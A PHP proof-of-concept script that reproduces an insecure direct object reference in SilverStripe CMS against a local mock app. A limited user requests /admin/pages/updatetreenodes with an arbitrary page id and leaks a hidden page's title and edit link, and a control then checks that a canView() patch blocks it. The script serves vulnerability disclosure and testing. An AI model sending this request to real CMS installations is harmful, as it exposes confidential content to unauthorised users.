<?php
/**
 * PoC for SilverStripe CMS CAND-98c9146b58cd.
 *
 * Run directly:
 *   php PoC.php
 *
 * Run via Docker:
 *   docker build -t poc-silverstripe-idor .
 *   docker run --rm poc-silverstripe-idor
 */

function fail(string $message): void
{
    fwrite(STDERR, "[FAIL] {$message}\n");
    exit(1);
}

function pass(string $message): void
{
    fwrite(STDOUT, "[PASS] {$message}\n");
}

function start_server(int $port): array
{
    $router = __DIR__ . '/vulnerable_app/index.php';
    $cmd = PHP_BINARY . ' -S 127.0.0.1:' . $port . ' ' . escapeshellarg($router);
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];
    $proc = proc_open($cmd, $descriptors, $pipes, __DIR__);
    if (!is_resource($proc)) {
        fail('could not start PHP built-in server');
    }
    foreach ($pipes as $pipe) {
        stream_set_blocking($pipe, false);
    }

    $deadline = microtime(true) + 5.0;
    while (microtime(true) < $deadline) {
        $body = @file_get_contents('http://127.0.0.1:' . $port . '/health');
        if ($body === 'ok') {
            return [$proc, $pipes];
        }
        usleep(100000);
    }
    fail('server did not become ready');
}

function stop_server($proc): void
{
    if (is_resource($proc)) {
        proc_terminate($proc);
        proc_close($proc);
    }
}

function http_get(int $port, string $path, string $cookie): array
{
    global $http_response_header;
    $http_response_header = [];
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "Cookie: {$cookie}\r\n",
            'ignore_errors' => true,
            'timeout' => 5,
        ],
    ]);
    $body = file_get_contents('http://127.0.0.1:' . $port . $path, false, $context);
    if ($body === false) {
        fail('HTTP request failed: ' . $path);
    }
    $status = 0;
    foreach ($http_response_header as $header) {
        if (preg_match('/^HTTP\/\S+\s+(\d+)/', $header, $m)) {
            $status = (int) $m[1];
        }
    }
    return [$status, $body];
}

$port = 18070;
[$proc, $pipes] = start_server($port);

try {
    $targetID = 42;
    $url = '/admin/pages/updatetreenodes?ids=' . $targetID;
    [$status, $body] = http_get($port, $url, 'cms_session=limited-cms-user');

    echo "[*] Requested vulnerable endpoint as limited CMS user: {$url}\n";
    echo "[*] HTTP status: {$status}\n";
    echo "[*] Response body:\n{$body}\n";

    if ($status !== 200) {
        fail('expected 200 from vulnerable endpoint');
    }
    if (strpos($body, 'CONFIDENTIAL: Acquisition Roadmap') === false) {
        fail('the hidden page title was not leaked; vulnerability did not reproduce');
    }
    $json = json_decode($body, true);
    if (!is_array($json) || !isset($json[(string) $targetID]['html'])) {
        fail('response was not the expected tree-node JSON object');
    }
    $html = $json[(string) $targetID]['html'];
    if (strpos($html, 'data-id="42"') === false || strpos($html, '/admin/pages/edit/show/42') === false) {
        fail('tree-node metadata/edit link was not leaked');
    }

    pass('IDOR reproduced: arbitrary ids=42 leaked a page tree node without page-level canView().');

    [$patchedStatus, $patchedBody] = http_get($port, '/admin/pages/updatetreenodes_patched?ids=' . $targetID, 'cms_session=limited-cms-user');
    echo "[*] Requested patched control endpoint as the same limited user.\n";
    echo "[*] Patched HTTP status: {$patchedStatus}\n";
    echo "[*] Patched response body:\n{$patchedBody}\n";

    if ($patchedStatus !== 200) {
        fail('patched control endpoint did not return 200');
    }
    if (strpos($patchedBody, 'CONFIDENTIAL: Acquisition Roadmap') !== false || strpos($patchedBody, 'data-id="42"') !== false) {
        fail('patched control still leaked the hidden page');
    }

    pass('control check passed: adding canView() blocks the same request.');
    echo "\nVULNERABLE: SilverStripe CMS CAND-98c9146b58cd reproduced successfully.\n";
} finally {
    stop_server($proc);
}
